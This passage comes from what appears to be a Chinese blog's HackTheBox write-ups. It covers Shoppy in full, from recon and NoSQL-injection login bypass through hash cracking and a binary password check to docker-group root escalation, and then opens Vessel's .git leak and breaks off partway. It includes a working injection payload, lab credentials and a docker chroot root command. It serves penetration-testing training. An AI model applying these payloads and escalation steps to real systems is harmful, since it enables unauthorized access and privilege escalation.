SF:automatic_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20generated\x20by\x20the\x20Go\x20runtime\.\n#\x20TYPE\x20go_gc_cycles_
SF:automatic_gc_cycles_total\x20counter\ngo_gc_cycles_automatic_gc_cycles_
SF:total\x2015\n#\x20HELP\x20go_gc_cycles_forced_gc_cycles_total\x20Count\
SF:x20of\x20completed\x20GC\x20cycles\x20forced\x20by\x20the\x20applicatio
SF:n\.\n#\x20TYPE\x20go_gc_cycles_forced_gc_cycles_total\x20counter\ngo_gc
SF:_cycles_forced_gc_cycles_total\x200\n#\x20HELP\x20go_gc_cycles_total_gc
SF:_cycles_total\x20Count\x20of\x20all\x20completed\x20GC\x20cycles\.\n#\x
SF:20TYPE\x20go_gc_cycles_total_gc_cycles_total\x20counter\ngo_gc_cycles_t
SF:otal_gc_cycles_total\x2015\n#\x20HELP\x20go_gc_duration_seconds\x20A\x2
SF:0summary\x20of\x20the\x20pause\x20duration\x20of\x20garbage\x20collecti
SF:on\x20cycles\.\n#\x20TYPE\x20go_gc_duration_seconds\x20summary\ngo_gc_d
SF:uration_seconds{quantile=\"0\"}\x202\.8824e-05\ngo_gc_duration_seconds{
SF:quantile=\"0\.25\"}\x207\.6212e-05\ngo_gc_d")%r(HTTPOptions,1A5A,"HTTP/
SF:1\.0\x20200\x20OK\r\nContent-Type:\x20text/plain;\x20version=0\.0\.4;\x
SF:20charset=utf-8\r\nDate:\x20Fri,\x2031\x20Mar\x202023\x2008:24:51\x20GM
SF:T\r\n\r\n#\x20HELP\x20go_gc_cycles_automatic_gc_cycles_total\x20Count\x
SF:20of\x20completed\x20GC\x20cycles\x20generated\x20by\x20the\x20Go\x20ru
SF:ntime\.\n#\x20TYPE\x20go_gc_cycles_automatic_gc_cycles_total\x20counter
SF:\ngo_gc_cycles_automatic_gc_cycles_total\x2015\n#\x20HELP\x20go_gc_cycl
SF:es_forced_gc_cycles_total\x20Count\x20of\x20completed\x20GC\x20cycles\x
SF:20forced\x20by\x20the\x20application\.\n#\x20TYPE\x20go_gc_cycles_force
SF:d_gc_cycles_total\x20counter\ngo_gc_cycles_forced_gc_cycles_total\x200\
SF:n#\x20HELP\x20go_gc_cycles_total_gc_cycles_total\x20Count\x20of\x20all\
SF:x20completed\x20GC\x20cycles\.\n#\x20TYPE\x20go_gc_cycles_total_gc_cycl
SF:es_total\x20counter\ngo_gc_cycles_total_gc_cycles_total\x2015\n#\x20HEL
SF:P\x20go_gc_duration_seconds\x20A\x20summary\x20of\x20the\x20pause\x20du
SF:ration\x20of\x20garbage\x20collection\x20cycles\.\n#\x20TYPE\x20go_gc_d
SF:uration_seconds\x20summary\ngo_gc_duration_seconds{quantile=\"0\"}\x202
SF:\.8824e-05\ngo_gc_duration_seconds{quantile=\"0\.25\"}\x207\.6212e-05\n
SF:go_gc_d");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.77 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（ssh）、80（http）、9093（copycat），获得域名<code>shoppy.htb</code></p>
<p>将域名添加进本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.129.92.247 shoppy.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>浏览器打开<code>shoppy.htb</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401165340368.png" style="zoom: 67%;">

<p>枚举子目录</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100 -mc 200,302,301 -u http://shoppy.htb/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shoppy.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,302,301
________________________________________________

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 413ms]
    * FUZZ: admin

[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 414ms]
    * FUZZ: images

[Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 417ms]
    * FUZZ: js

[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 435ms]
    * FUZZ: assets

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 441ms]
    * FUZZ: css

[Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 468ms]
    * FUZZ: login

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 323ms]
    * FUZZ: Admin

[Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 429ms]
    * FUZZ: Login

[Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 335ms]
    * FUZZ: fonts

[Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 327ms]
    * FUZZ: ADMIN

[Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 332ms]
    * FUZZ: exports

[Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 376ms]
    * FUZZ: 

[Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 330ms]
    * FUZZ: LOGIN

:: Progress: [20116/20116] :: Job [1/1] :: 282 req/sec :: Duration: [0:01:06] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>枚举到的目录，301的页面都没东西，302的都重定向到<code>/login</code>目录</p>
<h2 id="三、万能密码"><a href="#三、万能密码" class="headerlink" title="三、万能密码"></a>三、万能密码</h2><p>访问<code>shoppy.htb/login</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401165456260.png"></p>
<p>用户名输入如下，密码任意（万能密码），成功登录</p>
<pre class="line-numbers language-none"><code class="language-none">admin'||'1==1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401170449987.png" style="zoom: 67%;">

<p>点击页面右上角搜索标签，再次输入万能密码，弹出如下<code>Download export</code>标签</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401170711916.png"></p>
<p>点击<code>Download export</code>标签，得到两组账户，<code>admin</code>和<code>josh</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401170855524.png" style="zoom: 80%;">

<pre class="line-numbers language-none"><code class="language-none">[{
	"_id": "62db0e93d6d6a999a66ee67a",
	"username": "admin",
	"password": "23c6877d9e2b564ef8b32c3a23de27b2"
},
{
	"_id": "62db0e93d6d6a999a66ee67b",
	"username": "josh",
	"password": "6ebcea65320589ca4f2f1ce039975995"
}]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>破解hash：<a href="https://crackstation.net/">https://crackstation.net/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401171153928.png"></p>
<pre class="line-numbers language-none"><code class="language-none">josh
remembermethisway<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>用该账户登录ssh，不对</p>
<p>遂用wfuzz枚举子域名，发现很多301</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# wfuzz -u http://10.129.92.247 -H "Host: FUZZ.shoppy.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt             
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://10.129.92.247/
Total requests: 4989
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================
000000001:   301        7 L      11 W       169 Ch      "www"
000000020:   301        7 L      11 W       169 Ch      "www2"
000000019:   301        7 L      11 W       169 Ch      "dev"
000000015:   301        7 L      11 W       169 Ch      "ns"
000000003:   301        7 L      11 W       169 Ch      "ftp"
000000021:   301        7 L      11 W       169 Ch      "ns3"
000000022:   301        7 L      11 W       169 Ch      "pop3"
000000018:   301        7 L      11 W       169 Ch      "blog"
......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再用ffuf提速枚举子域名（wfuzz这个速度有点窒息，用ffuf或gobuster提速），并且换个大字典，过滤301响应</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.129.92.247 -H "Host: FUZZ.shoppy.htb" -fc 301 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.92.247
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.shoppy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

[Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 318ms]
    * FUZZ: mattermost

:: Progress: [100000/100000] :: Job [1/1] :: 100 req/sec :: Duration: [0:13:49] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现<code>mattermost</code>子域名，添加进本地hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">echo "10.129.92.247 mattermost.shoppy.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问<code>mattermost.shoppy.htb</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401171708091.png" style="zoom: 80%;">

<p>用刚刚的<code>josh</code>账户登录，在左侧<code>Deploy Machine</code>栏，聊天记录里发现<code>jaeger</code>账户</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401172244603.png" style="zoom:80%;">

<pre class="line-numbers language-none"><code class="language-none">username: jaeger
password: Sh0ppyBest@pp!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ssh连上（IP有变化是因为重启了靶机环境）</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# ssh jaeger@10.129.93.16
jaeger@10.129.93.16's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$ id
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
jaeger@shoppy:~$ pwd
/home/jaeger<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用<code>sudo -l</code>查看此用户权限</p>
<pre class="line-numbers language-none"><code class="language-none">jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现可执行命令<code>/home/deploy/password-manager</code>，用如下步骤下载到本地</p>
<p>在ssh窗口开启http服务</p>
<pre class="line-numbers language-none"><code class="language-none">jaeger@shoppy:/home/deploy$ python3 -m http.server 9898
Serving HTTP on 0.0.0.0 port 9898 (http://0.0.0.0:9898/) ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>然后在本地用如下命令下载</p>
<pre class="line-numbers language-none"><code class="language-none">wget http://10.129.93.16:9898/password-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>本地用<code>file</code>命令查看文件信息</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# file password-manager
password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>是64位ELF（Executable and Linkable Format）文件</p>
<h2 id="四、逆向分析"><a href="#四、逆向分析" class="headerlink" title="四、逆向分析"></a>四、逆向分析</h2><p>用<code>radare2</code>工具逆向静态分析一下</p>
<p>参考：<a href="https://blog.csdn.net/qq_28429161/article/details/107810534">https://blog.csdn.net/qq_28429161/article/details/107810534</a></p>
<pre class="line-numbers language-none"><code class="language-none">r2 password-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>输入如下指令，定位<code>main</code>函数地址</p>
<pre class="line-numbers language-none"><code class="language-none">&gt; aaa	#自动分析并命名函数
&gt; afl	#查看程序内的函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401174620711.png"></p>
<p>找到<code>main</code>函数，然后定位到main函数的地址并查看汇编代码</p>
<pre class="line-numbers language-none"><code class="language-none">&gt; s main  //定位到main函数入口
&gt; pdf  //查看当前函数的汇编代码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401174843635.png"></p>
<p>如上图，<code>int main()</code>和域运算符<code>::</code>表明这是C++程序，运行会先打印<code>Welcome to Josh password manager!</code></p>
<p>然后打印<code>Please enter your master password:   </code> ，并接收键盘输入，如下图</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401195552726.png"></p>
<p>然后将键盘输入与<code>Sample</code>逐一字符对比</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401195732987.png"></p>
<p>对比相同后，会打印<code>Access granted! Here is creds !</code>，然后调用<code>system()</code>函数执行<code>cat</code>命令，查看<code>/home/deploy/creds.txt</code>内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401200157303.png"></p>
<p>回到靶机ssh窗口，运行如下命令，提示<code>Please enter your master password:</code>时，输入<code>Sample</code></p>
<pre class="line-numbers language-none"><code class="language-none">jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可看到已得到账户<code>deploy</code>的用户名密码，执行<code>su deploy</code>切换到deploy账户</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401200606983.png" style="zoom:80%;">

<p>看到deploy用户属于<code>docker</code>组，在如下网站搜索<code>docker</code></p>
<pre class="line-numbers language-none"><code class="language-none">https://gtfobins.github.io/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="五、docker提权"><a href="#五、docker提权" class="headerlink" title="五、docker提权"></a>五、docker提权</h2><p>看到如下提权命令</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401201138192.png" style="zoom: 67%;">

<p>为了让获得的shell环境更稳定，把后面的<code>sh</code>换成<code>bash</code>，执行</p>
<pre class="line-numbers language-none"><code class="language-none">deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>成功获取root权限</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230401200943631.png" style="zoom:80%;">

<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230411190035530.png" style="zoom:80%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_45894840/article/details/127527914">https://blog.csdn.net/qq_45894840/article/details/127527914</a></p>
<p><a href="https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html">https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>万能密码</tag>
        <tag>逆向入门</tag>
        <tag>docker提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Vessel</title>
    <url>/posts/7c3ddaa9.html</url>
    <content><![CDATA[<h1 id="HTB-Vessel"><a href="#HTB-Vessel" class="headerlink" title="HTB-Vessel"></a>HTB-Vessel</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li>信息收集发现Git信息泄露；</li>
<li>分析Git信息发现Nodejs-SQL注入；</li>
<li>Nodejs-SQL注入以admin身份登录主站；</li>
<li>主站源码发现openwebanalytics子域；</li>
<li>Google发现OpenWebAnalytics存在CVE-2022-24637；</li>
<li>CVE-2022-24637以admin身份登录openwebanalytics子域并获取www-data用户shell；</li>
<li><code>/home/steven</code>发现可疑加密PDF文件和密码生成程序；</li>
<li>Python反编译密码生成程序破解PDF密码获取SSH用户密码；</li>
<li>登录SSH用户查询拥有suid权限的文件发现CVE-2022-0811；</li>
<li>CVE-2022-0811内核提权获取root用户权限。</li>
</ol>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap扫端口</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# nmap -sC -sV 10.10.11.178    
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-20 21:58 EDT
Nmap scan report for 10.10.11.178
Host is up (0.78s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA)
|   256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA)
|_  256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Vessel
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.56 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（ssh）、80（http）</p>
<p>浏览器访问IP，页面如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230321112036014.png"></p>
<p>ffuf枚举子目录</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,301 -u http://10.10.11.178/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.178/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301
________________________________________________

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 576ms]
    * FUZZ: dev

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 4584ms]
    * FUZZ: css

[Status: 200, Size: 2393, Words: 999, Lines: 52, Duration: 525ms]
    * FUZZ: 404

[Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 288ms]
    * FUZZ: login

[Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 884ms]
    * FUZZ: js

[Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 2728ms]
    * FUZZ: register

[Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 2683ms]
    * FUZZ: img

[Status: 200, Size: 2335, Words: 991, Lines: 52, Duration: 302ms]
    * FUZZ: 500

[Status: 200, Size: 15030, Words: 5599, Lines: 244, Duration: 301ms]
    * FUZZ: 

[Status: 200, Size: 3637, Words: 1604, Lines: 64, Duration: 374ms]
    * FUZZ: reset

[Status: 200, Size: 2400, Words: 1029, Lines: 53, Duration: 362ms]
    * FUZZ: 401

:: Progress: [26584/26584] :: Job [1/1] :: 293 req/sec :: Duration: [0:01:40] :: Errors: 2 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>301：<code>/dev</code>、<code>/css</code>、<code>/js</code>、<code>/img</code></p>
<p>200：<code>/404</code>、<code>/login</code>、<code>/register</code>、<code>/500</code>、<code>/reset</code>、<code>/401</code></p>
<p>以上目录，只有<code>/dev</code>最可能存在线索，因为其他几个都是比较常规的功能点。但对<code>/dev</code>目录做枚举，没发现什么东西，就猜一下<code>.git</code>，但<code>/dev/.git</code>做了跳转，会跳转到404，就进一层对<code>/dev/.git/</code>的子目录做枚举</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -mc 200,301 -u http://10.10.11.178/dev/.git/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.178/dev/.git/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,301
________________________________________________

[Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 280ms]
    * FUZZ: info

[Status: 200, Size: 2607, Words: 18, Lines: 19, Duration: 4971ms]
    * FUZZ: index

[Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 6035ms]
    * FUZZ: logs

[Status: 301, Size: 199, Words: 7, Lines: 11, Duration: 6166ms]
    * FUZZ: objects

[Status: 301, Size: 195, Words: 7, Lines: 11, Duration: 379ms]
    * FUZZ: hooks

[Status: 200, Size: 139, Words: 13, Lines: 9, Duration: 7085ms]
    * FUZZ: config

[Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 281ms]
    * FUZZ: description

[Status: 301, Size: 201, Words: 7, Lines: 11, Duration: 262ms]
    * FUZZ: branches

[Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 279ms]
    * FUZZ: refs

:: Progress: [63087/63087] :: Job [1/1] :: 322 req/sec :: Duration: [0:02:58] :: Errors: 0 ::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>确定存在Git信息泄露</p>
<h2 id="三、Git信息泄露"><a href="#三、Git信息泄露" class="headerlink" title="三、Git信息泄露"></a>三、Git信息泄露</h2><p>Git信息泄露参考：<a href="https://www.freebuf.com/articles/web/318599.html">https://www.freebuf.com/articles/web/318599.html</a></p>
<p>用<code>git-dumper</code>工具把git相关文件下载到本地（也可以用<code>GitHack</code>），此处下载到<code>./Vessel/git</code>目录下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip install git-dumper
git-dumper http://10.10.11.178/dev ./Vessel/git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230321112301438.png"></p>
<p><code>git log</code>看一下git日志，看到邮箱<code>ethan@vessel.htb</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# cd Vessel/git
                                                                                     
┌──(root💀kali)-[~/Desktop/Vessel/git]
└─# git log                                                                           
commit 208167e785aae5b052a4a2f9843d74e733fbd917 (HEAD -&gt; master)
Author: Ethan &lt;ethan@vessel.htb&gt;
Date:   Mon Aug 22 10:11:34 2022 -0400

    Potential security fixes

commit edb18f3e0cd9ee39769ff3951eeb799dd1d8517e
Author: Ethan &lt;ethan@vessel.htb&gt;
Date:   Fri Aug 12 14:19:19 2022 -0400

    Security Fixes

commit f1369cfecb4a3125ec4060f1a725ce4aa6cbecd3
Author: Ethan &lt;ethan@vessel.htb&gt;
Date:   Wed Aug 10 15:16:56 2022 -0400

    Initial commit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>用<code>tree命令</code>看一下文件目录树（也可用<code>GitKraken</code>或其他审计类工具分析git文件）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# tree -a Vessel/git/    
Vessel/git/
├── config
│&nbsp;&nbsp; └── db.js
├── .git
│&nbsp;&nbsp; ├── COMMIT_EDITMSG
│&nbsp;&nbsp; ├── config
│&nbsp;&nbsp; ├── description
│&nbsp;&nbsp; ├── HEAD
│&nbsp;&nbsp; ├── hooks
│&nbsp;&nbsp; │&nbsp;&nbsp; ├── applypatch-msg.sample
